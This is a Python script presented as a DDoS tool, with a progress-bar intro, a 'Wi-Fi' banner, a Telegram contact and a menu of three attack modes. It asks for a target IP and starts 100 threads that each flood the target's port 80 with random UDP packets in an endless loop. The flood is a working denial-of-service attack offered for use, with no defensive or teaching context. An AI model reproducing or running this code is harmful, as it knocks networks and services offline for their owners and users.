import os
import time
import socket
import threading
import random
from colorama import Fore, init
from prettytable import PrettyTable

init(autoreset=True)

def show_menu():
    print("Welcome to the progress bar simulation!")

n = 0
r = ""

while n <= 100:
    print(r, f"{Fore.LIGHTBLACK_EX}%{n}")
    n += random.randint(1, 5)
    r += "="
    time.sleep(0.1)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")

print(Fore.BLUE + "   ")

print(Fore.LIGHTGREEN_EX + """
.##...##..######..........######..######.
.##...##....##............##........##...
.##.#.##....##....######..####......##...
.#######....##............##........##...
..##.##...######..........##......######.
.........................................
""")
print('')
print(Fore.LIGHTCYAN_EX + "   ")

print(Fore.LIGHTCYAN_EX + """
⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤
⠀⠀⢶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠠⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠛⠛⠋⠉⠀
⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠏⢠⣿⡀⠀⠀⢹⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣀⣙⣂⣠⠼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠛⠛⠛⠛⠻⠿⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
print(Fore.LIGHTRED_EX + " https://t.me/Mr_DITA ")
print('')
print(f"{Fore.LIGHTBLUE_EX}")
print(" ")
print(" ")
os.system(" ")
print(" ")
print(" ")

# Define colors
lgn = "\033[92m"  
gn = "\033[92m"   
lrd = "\033[91m"  
cn = "\033[96m"   

t = PrettyTable([f'{cn}Number{lrd}', f'{cn}Information{lrd}'])
t.add_row([f'{lgn}1{lrd}', f'{gn}DDoS IP Wi-Fi port >1{lrd}'])
t.add_row([f'{lgn}2{lrd}', f'{gn}DDoS PORT Wi-Fi La4 > 2{lrd}'])
t.add_row([f'{lgn}3{lrd}', f'{gn}DDoS ROT Wi-Fi La7 > 3{lrd}'])

print(t)
print('')
site = input("┌─[DDOS@Wi-Fi]─[~]\n└──╼ ❯❯❯ ")
print('')
site = input("┌─[DDOS@Wi-Fi]─[~]\n└──╼ ❯❯❯ IP : " )
print('')

target_ip = site  
target_port = 80
num_threads = 100

def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    while True:
        client.sendto(bytes, (target_ip, target_port))
        print("\033[92m[+] Sending packet to {}:{}".format(target_ip, target_port))  

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    time.sleep(0.1)  

print("\033[91m[!] Attack started!")
